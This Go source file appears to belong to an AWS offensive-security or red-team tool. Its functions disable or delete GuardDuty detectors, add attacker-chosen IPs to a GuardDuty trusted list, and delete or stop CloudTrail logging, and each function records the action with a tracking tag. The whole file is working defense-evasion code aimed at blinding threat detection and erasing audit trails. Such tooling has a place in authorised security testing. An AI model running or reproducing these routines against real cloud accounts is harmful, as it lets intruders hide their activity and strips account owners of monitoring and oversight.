package awsdata

import (
	"fmt"

	"github.com/aws/aws-sdk-go/aws/session"
)

func KillGuardDuty(sess *session.Session, t string) {
	rando := SetTrackingAction(t, "gd-kill")

	detectors := ListDetectors(sess)
	if len(detectors.DetectorIds) > 0 {
		for _, d := range detectors.DetectorIds {
			fmt.Println(*d)
			DisableDetector(sess, *d)

		}
		fmt.Println("UA Tracking: exec-env/" + rando)
	} else {
		fmt.Println("GuardDuty is not enabled in this region.")
	}
}

func DisableGuardDuty(sess *session.Session, t string) {
	rando := SetTrackingAction(t, "gd-disable")

	detectors := ListDetectors(sess)
	if len(detectors.DetectorIds) > 0 {
		for _, d := range detectors.DetectorIds {
			fmt.Println(*d)
			UpdateDetector(sess, *d)

		}
		fmt.Println("UA Tracking: exec-env/" + rando)
	} else {
		fmt.Println("GuardDuty is not enabled in this region.")
	}
}

func TrustIPGuardDuty(sess *session.Session, location string, t string) {
	rando := SetTrackingAction(t, "gd-trustipset")

	detectors := ListDetectors(sess)
	if len(detectors.DetectorIds) > 0 {
		for _, d := range detectors.DetectorIds {
			fmt.Println(*d)
			CreateIPSet(sess, *d, location)

		}
		fmt.Println("UA Tracking: exec-env/" + rando)
	} else {
		fmt.Println("GuardDuty is not enabled in this region.")
	}
}

func KillCloudTrail(sess *session.Session, trail string, t string) {
	rando := SetTrackingAction(t, "cloudtrail-kill")

	DescribeTrails(sess)
	status := DeleteTrail(sess, trail)
	if status == true {
		fmt.Println("Successfully deleted trail: ", trail)
	} else {
		fmt.Println("")
	}

	fmt.Println("UA Tracking: exec-env/" + rando)
}

func StopCloudTrail(sess *session.Session, trail string, t string) {
	rando := SetTrackingAction(t, "cloudtrail-stop")

	DescribeTrails(sess)
	status := StopLogging(sess, trail)
	if status == true {
		fmt.Println("Successfully stopped logging for trail: ", trail)
	} else {
		fmt.Println("")
	}

	fmt.Println("UA Tracking: exec-env/" + rando)
}
